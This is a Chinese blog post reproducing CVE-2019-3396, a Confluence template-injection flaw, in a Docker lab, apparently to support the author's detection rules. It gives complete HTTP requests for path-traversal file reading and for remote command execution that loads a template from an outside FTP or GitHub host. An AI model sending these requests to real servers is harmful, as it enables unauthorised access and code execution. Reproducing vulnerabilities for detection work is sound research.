---
layout:     post
title:      【复现】Confluence路径穿越与命令执行漏洞
subtitle:   Confluence路径穿越与命令执行漏洞
date:       2019-09-20
author:     看不尽的尘埃
header-img: img/post-bg-ios9-web.jpg
catalog: 	 true
tags:
    - Confluence
---
## 前言
最近在给公司写指纹规则、漏洞检测和利用规则，因此漏洞复现的文章更新会比较频繁。

## 0x00 漏洞介绍
* 漏洞名称：Confluence 路径穿越与命令执行漏洞
* CVE编号：CVE-2019-3396
* 发布时间：2019-04-05
* 漏洞说明：Confluence Server 与 Confluence Data Center 中的 Widget Connector 存在服务端模板注入漏洞，攻击者构造特定请求可远程遍历服务器任意文件，甚至实现远程代码执行攻击。
* 影响范围：Confluence Server、Confluence Data Center
* 修复建议：目前官方已修复该漏洞，请升级到最新版

## 0x01 环境搭建
我的vulhub是老版本的，所以没有Confluence环境，我在Github找到了Confluence的docker-compose.yml：
```
version: '2'
	services:
	  web:
	    image: vulhub/confluence:6.10.2
	    ports:
	      - "8090:8090"
	    depends_on:
	      - db
	  db:
	    image: postgres:10.7-alpine
	    environment: 
	    - POSTGRES_PASSWORD=postgres
	    - POSTGRES_DB=confluence
```

保存下来，通过以下命令启动Confluence环境：
```
docker-compose up -d
```

访问10.20.40.96:8090，开始安装，选择Trial Installation后点击Next：
![图片](../../../../Confluence_rce_1.png)
这里需要去申请一个教育版的证书key:
![图片](../../../../Confluence_rce_2.png)
选择证书的时候需要注意选择Server版本的：

![图片](../../../../Confluence_rce_3.png)

输入License Key之后点击Next进入下一步，然后就会验证License Key，验证通过后开始安装，安装等待了五分钟，显示以下界面安装成功：
![图片](../../../../Confluence_rce_4.png)

### 搭建FTP Server
这里为了方便我使用python快速搭建FTP Server。
安装python ftp库：
```
pip3 install pyftpdlib
```
ftp_server.py代码如下：
```
from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer
 
authorizer = DummyAuthorizer()
authorizer.add_anonymous("F:\confluenceTest")
handler = FTPHandler
handler.authorizer = authorizer
server = FTPServer(("0.0.0.0", 21), handler)
server.serve_forever()
```

启动ftp_server.py:
```
python3 ftp_server.py
```
## 0x02 复现
### PoC验证
以读文件来验证漏洞是否存在，漏洞存在返回状态码为200，且存在指定关键词
```
POST /rest/tinymce/1/macro/preview HTTP/1.1
Host: 10.20.40.96:8090
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Referer: http://10.20.40.96:8090/pages/resumedraft.action?draftId=786457&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&
Content-Type: application/json; charset=utf-8
Content-Length: 168

{"contentId":"786458","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc6","width":"1000","height":"1000","_template":"../web.xml"}}}
```

### EXP利用
下面的这个EXP需要用到我们在环境搭建的时候搭建的FTP Server
```
POST /rest/tinymce/1/macro/preview HTTP/1.1
Host: 10.20.40.96:8090
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Referer: http://10.20.40.96:8090/pages/resumedraft.action?draftId=786457&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&
Content-Type: application/json; charset=utf-8
Content-Length: 195

{"contentId":"786458","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc6","width":"1000","height":"1000","_template":"ftp://10.20.40.95/cmd.vm","cmd":"id"}}}
```
可以看到下图成功执行了id命令：
![图片](../../../../Confluence_rce_5.png)

如果觉得FTP服务麻烦的也可以使用https服务，我测试的时候也是可以执行命令的，http服务是不行的。
Github地址：[https://raw.githubusercontent.com/Yt1g3r/CVE-2019-3396_EXP/master/cmd.vm](https://raw.githubusercontent.com/Yt1g3r/CVE-2019-3396_EXP/master/cmd.vm)
```
POST http://10.20.40.96:8090/rest/tinymce/1/macro/preview HTTP/1.1
Host: 10.20.40.96:8090
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Referer: http://10.20.40.96:8090/pages/resumedraft.action?draftId=786457&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&
Content-Type: application/json; charset=utf-8
Content-Length: 247

{"contentId":"786458","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc6","width":"1000","height":"1000","_template":"https://raw.githubusercontent.com/Yt1g3r/CVE-2019-3396_EXP/master/cmd.vm","cmd":"whoami"}}}
```
![图片](../../../../Confluence_rce_6.png)

## 0x03 指纹
Confluence有一个非常明显的指纹特征，在响应报文中有两个字段：
* X-Confluence-Cluster-Node
* X-Confluence-Request-Time
## 0x04 总结
这个漏洞我在4月份的时候复现过，当时没有vm文件，所以只复现了读文件。时隔4个月，现在再来复现RCE的时候一开始还是遇到了问题，发包后服务器一直没响应，后来发现是FTP Server代码只开启监听本地，把127.0.0.1改成0.0.0.0就好了。

